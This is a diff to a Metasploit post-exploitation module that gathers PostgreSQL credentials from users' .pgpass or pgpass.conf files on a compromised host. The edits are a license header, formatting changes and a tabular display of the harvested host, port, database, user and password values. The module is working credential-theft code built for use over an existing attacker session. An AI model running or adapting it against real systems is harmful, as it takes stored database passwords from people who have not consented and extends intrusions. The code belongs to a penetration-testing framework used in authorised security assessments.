@@ -1,5 +1,11 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+#   http://metasploit.com/framework/
+##
+
 require 'msf/core'
-require 'rex'
 require 'msf/core/post/file'
 require 'msf/core/post/common'
 require 'msf/core/post/unix'
@@ -14,16 +20,15 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info(info,
-			'Name'			 => 'Multi Gather pgpass Credentials',
-			'Description'	=> %q{
+			'Name'          => 'Multi Gather pgpass Credentials',
+			'Description'   => %q{
 					This module will collect the contents of user's .pgpass or pgpass.conf and
-				parse them for credentials. This module is largely based on firefox_creds.rb and
-				ssh_creds.rb.
+				parse them for credentials.
 			},
-			'License'		=> MSF_LICENSE,
-			'Author'		 => ['Zach Grace <zgrace[at]403labs.com>'],
-			'Platform'		 => %w[linux bsd unix osx win],
-			'SessionTypes'	 => %w[meterpreter shell]
+			'License'       => MSF_LICENSE,
+			'Author'        => ['Zach Grace <zgrace[at]403labs.com>'],
+			'Platform'      => %w[linux bsd unix osx win],
+			'SessionTypes'  => %w[meterpreter shell]
 		))
 	end
 
@@ -43,7 +48,7 @@ class Metasploit3 < Msf::Post
 			grab_user_profiles.select do |user|
 				f = "#{user['AppData']}\\postgresql\\pgpass.conf"
 				if user['AppData'] && file?(f)
-						files << f
+					files << f
 				end
 			end
 		else
@@ -68,6 +73,12 @@ class Metasploit3 < Msf::Post
 
 	# Store the creds to
 	def parse_creds(f)
+		cred_table = Rex::Ui::Text::Table.new(
+			'Header'  => 'Postgres Data',
+			'Indent'  => 1,
+			'Columns' => ['Host', 'Port', 'DB', 'User', 'Password']
+		)
+
 		read_file(f).each_line do |entry|
 			ip, port, db, user, pass = entry.chomp.split(/:/, 5)
 
@@ -93,21 +104,26 @@ class Metasploit3 < Msf::Post
 			end
 
 			pass = p
-			print_good("Retrieved postgres creds #{ip}:#{port}/#{db} #{user}:#{pass}")
+			cred_table << [ip, port, db, user, pass]
 
 			cred_hash = {
-				host: session.session_host,
-				port: port,
-				user: user,
-				pass: pass,
-				ptype: "password",
-				sname: "postgres",
-				source_type: "Cred",
-				duplicate_ok: true,
-				active: true
+				:host => session.session_host,
+				:port => port,
+				:user => user,
+				:pass => pass,
+				:ptype => "password",
+				:sname => "postgres",
+				:source_type => "Cred",
+				:duplicate_ok => true,
+				:active => true
 			}
 
 			report_auth_info(cred_hash)
+		end
+
+		if not cred_table.rows.empty?
+			print_line
+			print_line(cred_table.to_s)
 		end
 	end
 end
